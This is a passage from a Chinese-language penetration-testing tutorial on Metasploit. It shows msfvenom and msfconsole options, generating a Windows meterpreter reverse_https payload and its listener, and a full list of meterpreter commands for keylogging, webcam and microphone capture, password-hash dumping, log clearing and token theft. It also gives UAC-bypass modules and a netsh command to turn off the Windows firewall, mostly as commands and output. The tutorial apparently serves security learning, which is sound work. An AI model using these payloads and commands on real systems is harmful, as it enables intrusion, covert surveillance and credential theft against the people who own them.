 + Windows [.exe // .dll]</span><br><span class="line"> </span><br><span class="line">&lt;DOMAIN/IP&gt;可使用网卡和MAC地址来探测ip，若不填写将会在生成过程中显示列表来选择</span><br><span class="line">&lt;PORT&gt; 默认443端口</span><br><span class="line">&lt;CMD&gt;使用本地shell</span><br><span class="line">&lt;MSF&gt; 使用meterpreter（默认使用它）</span><br><span class="line">&lt;BIND&gt; 绑定型shell</span><br><span class="line">&lt;REVERSE&gt; 反弹型shell（默认使用它）</span><br><span class="line">&lt;STAGED&gt; 将shellcode分片，需要依赖msf（默认使用它）</span><br><span class="line">&lt;STAGELESS&gt; 不分片</span><br><span class="line">&lt;TCP&gt; 使用TCP协议明文传输，适应性好，容易被IDS等发现（默认使用它）</span><br><span class="line">&lt;HTTP&gt; 使用HTTP协议明文传输，适用于限制80端口传输使用</span><br><span class="line">&lt;HTTPS&gt; 使用HTTPS加密传输，适用于限制在443端口传输，不易被IDS等发现</span><br><span class="line">&lt;FIND_PORT&gt; 将尝试所有端口来突破防火墙</span><br><span class="line">&lt;BATCH&gt;生成每一种组合</span><br><span class="line">&lt;LOOP&gt; 生成每一种类型的</span><br><span class="line">&lt;VERBOSE&gt;显示更加详细的信息</span><br></pre></td></tr></table></figure>
+
+<p>运行命令后，他将生成payload和相应的监听资源文件，使用msfconsole –r ****.rc进行监听，等待目标上钩<br><img src="https://puui.qpic.cn/fans_admin/0/3_1333245325_1571990603251/0" alt=""><br>例如这里，他显示用了什么命令，生成的payload位置，怎么进行监听，怎么快速发布payload。</p>
+<h3 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# msfvenom</span><br><span class="line">#Msf的独立payload生成器，用来替代msfpayload and msfencode.（这出现在以前的书里。。。）</span><br><span class="line">Usage: /usr/bin/msfvenom [options] &lt;var=val&gt;</span><br><span class="line"> </span><br><span class="line">Options:</span><br><span class="line">    -p, --payload       &lt;payload&gt;    指定payload，使用-来使用标准输入从而使用自定义的payload</span><br><span class="line">        --payload-options            列出指定payload的设直项</span><br><span class="line">    -l, --list          [type]                       列出可使用的模块，可使用payloads, encoders, nops, 筛选</span><br><span class="line">    -n, --nopsled       &lt;length&gt;     设置空指令滑行长度</span><br><span class="line">    -f, --format        &lt;format&gt;     指定输出格式</span><br><span class="line">        --help-formats               列出支持的格式</span><br><span class="line">    -e, --encoder       &lt;encoder&gt;    指定编码器</span><br><span class="line">    -a, --arch          &lt;arch&gt;       指定架构</span><br><span class="line">        --platform      &lt;platform&gt;   指定平台</span><br><span class="line">        --help-platforms             列出支持的平台</span><br><span class="line">    -s, --space         &lt;length&gt;     现在payload的最大尺寸</span><br><span class="line">        --encoder-space &lt;length&gt;     最大编码尺寸</span><br><span class="line">    -b, --bad-chars     &lt;list&gt;       指定要编码的坏字符，例如：&apos;\x00\xff&apos;</span><br><span class="line">    -i, --iterations    &lt;count&gt;      编码次数</span><br><span class="line">    -c, --add-code      &lt;path&gt;       指定包含一个额外的win32shellcode文件</span><br><span class="line">    -x, --template      &lt;path&gt;       指定一个可执行文件作为模板</span><br><span class="line">    -k, --keep                       保持原模板软件有效性</span><br><span class="line">    -o, --out           &lt;path&gt;       指定输出位置</span><br><span class="line">    -v, --var-name      &lt;name&gt;      指定一个自定义的变量名去使用特定输出格式</span><br><span class="line">        --smallest                   生成尽可能小的payload</span><br></pre></td></tr></table></figure>
+
+<h3 id="msfconsole"><a href="#msfconsole" class="headerlink" title="msfconsole"></a>msfconsole</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# msfconsole -h</span><br><span class="line">Usage: msfconsole [options]</span><br><span class="line">Common options</span><br><span class="line">    -E, --environment ENVIRONMENT    The Rails environment. Will use RAIL_ENV environment variable if that is set.  Defaults to production if neither option not RAILS_ENV environment variable is set.</span><br><span class="line">Database options</span><br><span class="line">    -M, --migration-path DIRECTORY   指定一个额外的包含migration DB的目录</span><br><span class="line">    -n, --no-database                不适用数据库</span><br><span class="line">    -y, --yaml PATH                  指定包含数据库设置的yaml文件地址</span><br><span class="line">Framework options</span><br><span class="line">    -c FILE                          载入指定的配置文件</span><br><span class="line">Module options</span><br><span class="line">        --defer-module-loads         延期载入模块</span><br><span class="line">    -m, --module-path DIRECTORY      添加一个额外的模块路径</span><br><span class="line">Console options:</span><br><span class="line">    -a, --ask                        退出之前先询问</span><br><span class="line">    -L, --real-readline              使用系统的readline而非rb的</span><br><span class="line">    -o, --output FILE                输出到指定文件</span><br><span class="line">    -p, --plugin PLUGIN              启动时即载入插件</span><br><span class="line">    -q, --quiet                      安静启动</span><br><span class="line">    -r, --resource FILE              使用资源文件，可用-表示标准输入</span><br><span class="line">    -x, --execute-command COMMAND    相当于以前的msfcli，后面执行一些命令，用;分隔</span><br><span class="line">msf &gt; ?</span><br><span class="line">核心命令</span><br><span class="line">=============</span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    ?             显示帮助</span><br><span class="line">    advanced      后接模块，显示高级配置信息</span><br><span class="line">    back          返回上层</span><br><span class="line">    cd            改变当前工作目录</span><br><span class="line">    connect       相当于nc</span><br><span class="line">		Usage: connect [options] &lt;host&gt; &lt;port&gt;</span><br><span class="line">		-C        对EOL sequence尝试使用回车换行.</span><br><span class="line">		-P &lt;opt&gt;  指定源端口</span><br><span class="line">		-S &lt;opt&gt;  指定源地址</span><br><span class="line">		-i &lt;opt&gt;  指定发送一个文件的内容。</span><br><span class="line">		-s        使用ssl连接</span><br><span class="line">		-u        切换成UDP的socket</span><br><span class="line">		-w &lt;opt&gt;  指定连接超时</span><br><span class="line">		-z        只去连接一下就返回</span><br><span class="line">    edit          编辑当前使用的模块</span><br><span class="line">    exit          退出</span><br><span class="line">    get           获取指定局部变量的值</span><br><span class="line">    getg          获取指定全局变量的值</span><br><span class="line">    grep          grep命令</span><br><span class="line">    info          显示指定模块的信息</span><br><span class="line">    irb           进入irb模式（可用来编写irb脚本并执行）可以跟-e接脚本直接执行</span><br><span class="line">    jobs          显示，管理job（在任务较多时可以再使用参数）</span><br><span class="line">    kill          杀死一个job</span><br><span class="line">    load          载入指定插件（载如插件后又是一mol功能，以后再说。。。）</span><br><span class="line">    loadpath      载如一个指定位置的插件</span><br><span class="line">    makerc        将本次进入控制台后使用的命令全部保存为资源文件（就相当于批处理文件）</span><br><span class="line">    options       显示指定端口的一般设置项信息</span><br><span class="line">    reload_all    重载所有模块</span><br><span class="line">    rename_job    重命名一个jobs</span><br><span class="line">    resource      运行一个资源文件</span><br><span class="line">    route         使用指定session来路由，实现内网渗透等</span><br><span class="line">		route [add/remove/get/flush/print] subnet netmask [comm/sid]</span><br><span class="line">    search        搜索模块</span><br><span class="line">		Usage: search [keywords]</span><br><span class="line">			Keywords:</span><br><span class="line">			  app       :  匹配客户端还是服务端攻击</span><br><span class="line">			  author    :  匹配作者</span><br><span class="line">			  bid       :  匹配Bugtraq ID</span><br><span class="line">			  cve       :  匹配CVE ID</span><br><span class="line">			  edb       :  匹配Exploit-DB ID</span><br><span class="line">			  name      :  匹配描述name</span><br><span class="line">			  osvdb     :  匹配OSVDB ID</span><br><span class="line">			  platform  :  匹配平台（Windows，Linux，Android等）</span><br><span class="line">			  ref       :  匹配ref</span><br><span class="line">			  type      :  匹配指定类型模块(exploit, auxiliary, or post)</span><br><span class="line">			例如:</span><br><span class="line">			  search cve:2009 type:exploit app:client</span><br><span class="line">    sessions      管理session的</span><br><span class="line">			Usage: sessions [options]</span><br><span class="line">			OPTIONS:</span><br><span class="line">				-K        终止所有sessions</span><br><span class="line">				-c &lt;opt&gt;  与-i配合，对指定session运行指定命令（不使用-i将会对所有生效）</span><br><span class="line">				-i &lt;opt&gt;  交互式方式进入session</span><br><span class="line">				-k &lt;opt&gt;  终止会话</span><br><span class="line">				-l        列出所有sessions</span><br><span class="line">				-q        安静模式</span><br><span class="line">				-r        与-i配合，对指定session重置环形缓冲区（不使用-i将会对所有生效）</span><br><span class="line">				-s &lt;opt&gt;  和-i配合，对指定session运行指定脚本（不使用-i将会对所有生效）</span><br><span class="line">				-t &lt;opt&gt;  设置响应超时</span><br><span class="line">				-u &lt;opt&gt;  将shell升级为meterpreter</span><br><span class="line">				-v        列出详细的</span><br><span class="line">				-x        显示扩展的信息</span><br><span class="line">    set           设置局部变量的值</span><br><span class="line">    setg          设置全局变量的值</span><br><span class="line">    show          显示被指定的类型或是所有</span><br><span class="line">		[*] 可以使用类型过滤：all, encoders, nops, exploits, payloads, auxiliary, plugins, info, options</span><br><span class="line">		[*] 在模块中可以这样用: missing, advanced, evasion, targets, actions</span><br><span class="line">    sleep         在数秒内不做任何事</span><br><span class="line">    spool         将以后的输出同时写入指定文件便于查看</span><br><span class="line">    threads       查看当前工作的线程</span><br><span class="line">    unload        卸载指定插件</span><br><span class="line">    unset         去除局部变量的赋值</span><br><span class="line">    unsetg        去除指定全局变量的赋值</span><br><span class="line">    use           使用指定的模块</span><br><span class="line">数据库命令</span><br><span class="line">=========================</span><br><span class="line">    Command           Description</span><br><span class="line">    -------           -----------</span><br><span class="line">    creds             列出所有creds信息</span><br><span class="line">    db_connect        连接一个存在的数据库</span><br><span class="line">    db_disconnect     断开数据库连接</span><br><span class="line">    db_export         导出文件</span><br><span class="line">    db_import         倒入一个扫描结果文件（会自动探测类型）直接使用命令可以看到支持的类型</span><br><span class="line">    db_nmap           和nmap一样，只是这个直接将结果写入数据库</span><br><span class="line">    db_rebuild_cache  重建数据库缓存</span><br><span class="line">    db_status         显示当前数据库连接状态</span><br><span class="line">    hosts             列出主机</span><br><span class="line">    loot              列出所有信息（这些命令都可以使用参数来自定义。。。。）</span><br><span class="line">    notes             列出所有的主机</span><br><span class="line">    services          列出所有的服务</span><br><span class="line">    vulns             列出所有的漏洞</span><br><span class="line">    workspace         管理工作空间的</span><br><span class="line">			workspace                  列出工作空间</span><br><span class="line">			workspace [name]           切换到指定工作空间</span><br><span class="line">			workspace -a [name] ...    添加</span><br><span class="line">			workspace -d [name] ...    删除</span><br><span class="line">			workspace -D               删除所有</span><br><span class="line">			workspace -r &lt;old&gt; &lt;new&gt;   重命名</span><br></pre></td></tr></table></figure>
+
+<h2 id="meterpreter"><a href="#meterpreter" class="headerlink" title="meterpreter"></a>meterpreter</h2><hr>
+<p>高级,动态,可扩展的payload，它要远强于系统自带shell，在后渗透测试阶段提供一站式操作界面，所以能够使用meterpreter尽量使用它。<br>它的特点：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">完全基于内存的dll注入式payload（不写入硬盘，当然也可以写入硬盘实现持续控制）</span><br><span class="line">注入合法系统进程并建立stager（传输器）</span><br><span class="line">基于stager上传和预加载dll进行扩展模块注入（客户端API）</span><br><span class="line">基于stager建立的socket链接建立加密的TLS/1.0通信隧道</span><br><span class="line">利用TLS隧道进一步加载后续扩展模块（避免网络取证）</span><br><span class="line">服务端（攻击者端）使用C语言编写</span><br><span class="line">客户端（受害者端）提供基于ruby的全特性API（支持任何语言，只是其他语言不一定是全功能）</span><br></pre></td></tr></table></figure>
+
+<h3 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h3><p>之所以插播此部分，因为可能因为各种原因导致主动利用不成功而无法继续meterpreter实验。先生成payload手动在靶机上运行就可以不必太依赖其他知识，生成方法可以使用msfvenom或是免杀里面介绍的其他内容，也可以使用msfconsole:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use payload/windows/meterpreter/reverse_https</span><br><span class="line">msf payload(reverse_https) &gt; show options </span><br><span class="line">Module options (payload/windows/meterpreter/reverse_https):</span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &apos;&apos;, seh, thread, process, none)</span><br><span class="line">   LHOST                      yes       The local listener hostname</span><br><span class="line">   LPORT     8443             yes       The local listener port</span><br><span class="line">   LURI                       no        The HTTP Path</span><br><span class="line">msf payload(reverse_https) &gt; set LHOST 192.168.79.130</span><br><span class="line">LHOST =&gt; 192.168.79.130</span><br><span class="line">msf payload(reverse_https) &gt; generate -h</span><br><span class="line">Usage: generate [options]</span><br><span class="line">Generates a payload.</span><br><span class="line">OPTIONS:</span><br><span class="line">    -E        强制编码</span><br><span class="line">    -b &lt;opt&gt;  排除坏字符，例如: &apos;\x00\xff&apos;</span><br><span class="line">    -e &lt;opt&gt;  指定编码器</span><br><span class="line">    -f &lt;opt&gt;  指定输出文件，否则输出到屏幕</span><br><span class="line">    -i &lt;opt&gt;  编码几次</span><br><span class="line">    -k        保留模板功能</span><br><span class="line">    -o &lt;opt&gt;  用逗号分隔形式指定参数</span><br><span class="line">    -p &lt;opt&gt;  输出平台</span><br><span class="line">    -s &lt;opt&gt;  Nop滑行长度</span><br><span class="line">    -t &lt;opt&gt;  输出格式: bash,c,csharp,dw,dword,hex,java,js_be,js_le,num,perl,pl,powershell,ps1,py,python,raw,rb,ruby,sh,vbapplication,vbscript,asp,aspx,aspx-exe,axis2,dll,elf,elf-so,exe,exe-only,exe-service,exe-small,hta-psh,jar,loop-vbs,macho,msi,msi-nouac,osx-app,psh,psh-cmd,psh-net,psh-reflection,vba,vba-exe,vba-psh,vbs,war</span><br><span class="line">-x &lt;opt&gt;  指定模板</span><br></pre></td></tr></table></figure>
+
+
+
+<p>此处，排除坏字符是使用编码器将坏字符编码而不是直接舍弃，它是智能选择，在排除坏字符功能实现的前提下使用最优秀的编码器，若坏字符太多可能就不能找到编码器编码咯！这里示例如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf payload(reverse_https) &gt; generate -b &apos;\x00\xff&apos; -s 20 -t exe -p x86 -f hia.exe</span><br></pre></td></tr></table></figure>
+
+
+
+<p>启动监听：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">msf payload(reverse_https) &gt; use exploit/multi/handler </span><br><span class="line">msf exploit(handler) &gt; set payload windows/meterpreter/reverse_https</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_https</span><br><span class="line">msf exploit(handler) &gt; show options </span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line">Payload options (windows/meterpreter/reverse_https):</span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &apos;&apos;, seh, thread, process, none)</span><br><span class="line">   LHOST                      yes       The local listener hostname</span><br><span class="line">   LPORT     8443             yes       The local listener port</span><br><span class="line">   LURI                       no        The HTTP Path</span><br><span class="line">Exploit target:</span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line">msf exploit(handler) &gt; set LHOST 0.0.0.0</span><br><span class="line">LHOST =&gt; 0.0.0.0</span><br><span class="line">msf exploit(handler) &gt; run</span><br><span class="line">[*] Started HTTPS reverse handler on https://0.0.0.0:8443</span><br><span class="line">[*] Starting the payload handler...</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="使用meterpreter"><a href="#使用meterpreter" class="headerlink" title="使用meterpreter"></a>使用meterpreter</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">meterpreter核心命令</span><br><span class="line">=============</span><br><span class="line">? / help                  显示帮助菜单 </span><br><span class="line">background               将此会话放进后台（回话依然存在，这样可以使用其他模块利用此session来做更多事）</span><br><span class="line">bgkill                    杀死一个后台会话</span><br><span class="line">bglist                    显示后台运行的脚本</span><br><span class="line">bgrun                     运行一个meterpreter脚本作为后台线程</span><br><span class="line">channel                   显示频道里信息或者控制频道</span><br><span class="line">close                     关闭频道</span><br><span class="line">exit / quit               终止meterpreter会话</span><br><span class="line">get_timeouts              得到当前回话的超时值</span><br><span class="line">info                      显示关于选定模块的信息</span><br><span class="line">irb                       进入rb脚本模式</span><br><span class="line">load                      载入一个或多个meterpreter扩展</span><br><span class="line">machine_id                Get the MSF ID of the machine attached to the session</span><br><span class="line">migrate                   迁移攻击载荷到指定的pid或者进程名(默认pid，-N name进程名)</span><br><span class="line">read / write              从一个频道读取/写入数据</span><br><span class="line">resource                  运行一个资源文件（类似批处理脚本）</span><br><span class="line">run                       运行一个meterpreter脚本或模块</span><br><span class="line">set_timeouts              设置当前模块连接超时值</span><br><span class="line">sleep                     强制meterpreter去什么都不做再重新连接</span><br><span class="line">transport                 改变当前传输机制（后续发）</span><br><span class="line">use                       改变load的别名</span><br><span class="line">uuid                      获取当前的uuid</span><br><span class="line">文件命令(和Linux几乎一致)</span><br><span class="line">============================</span><br><span class="line">cat           把一个文件内容输出到屏幕（查看文件内容）</span><br><span class="line">cd            移动到其他目录</span><br><span class="line">download      下载一个文件或目录</span><br><span class="line">Usage: download [options] src1 src2 src3 ... destination</span><br><span class="line">OPTIONS:</span><br><span class="line">-r        递归下载所有内容</span><br><span class="line">-t        时间戳也要下载</span><br><span class="line">edit          编辑一个文件（和vim操作类似）</span><br><span class="line">lpwd           查看本地目录</span><br><span class="line">getwd         查看远程目录</span><br><span class="line">lcd           改变本地工作目录</span><br><span class="line">ls            列出文件</span><br><span class="line">mkdir         创建目录</span><br><span class="line">mv            移动</span><br><span class="line">pwd           显示当前工作目录</span><br><span class="line">rm            删除</span><br><span class="line">rmdir         删除目录</span><br><span class="line">search        搜素</span><br><span class="line">show_mount    列出所有设备（磁盘）</span><br><span class="line">upload        上传文件或目录（-r 地柜上传）</span><br><span class="line">网络命令</span><br><span class="line">===========================</span><br><span class="line">arp          显示ARP缓存表</span><br><span class="line">getproxy      显示代理设置</span><br><span class="line">ifconfig      显示网卡设置</span><br><span class="line">ipconfig      显示网卡设置</span><br><span class="line">netstat       显示网络连接状态</span><br><span class="line">portfwd       指向一个本地端口到远程服务（端口转发，后续会发）</span><br><span class="line">route         显示(修改)受害主机路由表</span><br><span class="line">Supported commands:</span><br><span class="line">   add    [subnet] [netmask] [gateway]</span><br><span class="line">   delete [subnet] [netmask] [gateway]</span><br><span class="line">   list</span><br><span class="line">系统命令</span><br><span class="line">=======================</span><br><span class="line">clearev        清除事件日志（系统自带的日志）</span><br><span class="line">drop_token    放弃所有的假冒令牌</span><br><span class="line">execute       执行一条命令（后续发）</span><br><span class="line">getenv        取得指定的一个或多环境变量的值</span><br><span class="line">getpid        得到当前进程的pid（攻击shell的pid）</span><br><span class="line">getprivs      尝试获取所有特权      </span><br><span class="line">getsid        Get the SID of the user that the server is running as</span><br><span class="line">getuid        显示当前的身份</span><br><span class="line">kill          杀死一个进程，后接pid，参数-s杀死相关的进程</span><br><span class="line">ps            列出目标主机的进程</span><br><span class="line">reboot        重启目标主机</span><br><span class="line">shutdown      关闭目标主机</span><br><span class="line">reg          修改注册表，可查看帮助（后续发）</span><br><span class="line">rev2self      回到目标主机的初始用户账户下（例如开始是admin后来提权为system，可以回到admin）</span><br><span class="line">shell         使用Windows系统命令行</span><br><span class="line">steal_token   尝试盗取一个令牌</span><br><span class="line">suspend      暂停或恢复一个列表进程</span><br><span class="line">sysinfo       取得目标主机的系统信息，含电脑名，操作系统，架构，语言，工作组，登录用户数</span><br><span class="line">用户界面命令</span><br><span class="line">===============================</span><br><span class="line">enumdesktops   列举出目标主机上所有的桌面</span><br><span class="line">idletime       返回目标主机已经被闲置了多少时间</span><br><span class="line">keyscan_dump   得到键盘录制的内容</span><br><span class="line">keyscan_start  开始键盘录制</span><br><span class="line">keyscan_stop   停止键盘录制</span><br><span class="line">screenshot     抓取屏幕截图</span><br><span class="line">setdesktop     切换到其他用户界面【当有多个用户登录时】</span><br><span class="line">uictl          控制用户的键盘，鼠标</span><br><span class="line">网络摄像头命令</span><br><span class="line">=======================</span><br><span class="line">record_mic     从默认的录入设备记录x秒的音频</span><br><span class="line">OPTIONS:</span><br><span class="line">    -d &lt;opt&gt;  记录几秒，默认1s</span><br><span class="line">    -f &lt;opt&gt;  保存路径，默认：&apos;/root/[randomname].wav&apos;</span><br><span class="line">    -p &lt;opt&gt;  自动播放捕获到的音频，默认：true</span><br><span class="line">webcam_chat    开启一个视频聊天</span><br><span class="line">webcam_list    显示设备列表</span><br><span class="line">webcam_snap    从指定的设备拍照截图</span><br><span class="line">webcam_stream  从指定的webcam播放视频流</span><br><span class="line">权限提升</span><br><span class="line">======================</span><br><span class="line">getsystem     尝试提升用户权限</span><br><span class="line">密码数据库</span><br><span class="line">================================</span><br><span class="line">hashdump      下载密码哈希值（sam库）</span><br><span class="line">文件属性</span><br><span class="line">timestomp     修改文件的属性（后续发）</span><br></pre></td></tr></table></figure>
+
+<h2 id="后渗透测试"><a href="#后渗透测试" class="headerlink" title="后渗透测试"></a>后渗透测试</h2><hr>
+<h3 id="admin绕过UAC"><a href="#admin绕过UAC" class="headerlink" title="admin绕过UAC"></a>admin绕过UAC</h3><p>Win7及以上默认都会开启用户访问控制，即使得到administrator权限也不能直接提权到system（如下图），所以要先绕过UAC，下面是方法，前提是已经有一个administrator的shell了。<br><img src="https://puui.qpic.cn/fans_admin/0/3_2007801347_1571991978047/0" alt=""><br>0X01 use exploit/windows/local/ask<br>设置一个欺骗性的名字，然后在受害主机弹出确认框，若对方确认则成功<br><img src="https://puui.qpic.cn/fans_admin/0/3_2007801347_1571992016438/0" alt=""><br>0X02 use exploit/windows/local/bypassuac_vbs<br>也是需要用户确认，通过vbs来绕过，生成了清理文件可以手动点击清理<br><img src="https://puui.qpic.cn/fans_admin/0/3_2007801347_1571992048300/0" alt=""><br>目标会弹出确认框，需要点击确认才行<br><img src="https://puui.qpic.cn/fans_admin/0/3_2007801347_1571992073791/0" alt=""><br>0X03 use exploit/windows/local/bypassuac</p>
+<h3 id="低权限system提权"><a href="#低权限system提权" class="headerlink" title="低权限system提权"></a>低权限system提权</h3><p>如题，需要一个低权限的shell，然后需要利用目标存在的漏洞，可在<br>Exploit/windows/local/目录下搜索能够提权的模块。</p>
+<h3 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h3><p>现在及之后命令都是在system权限下进行的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://puui.qpic.cn/fans_admin/0/3_2007801347_1571992141542/0" alt=""><br>不过这样隐蔽性不好，可以直接添加一条规则：</p>
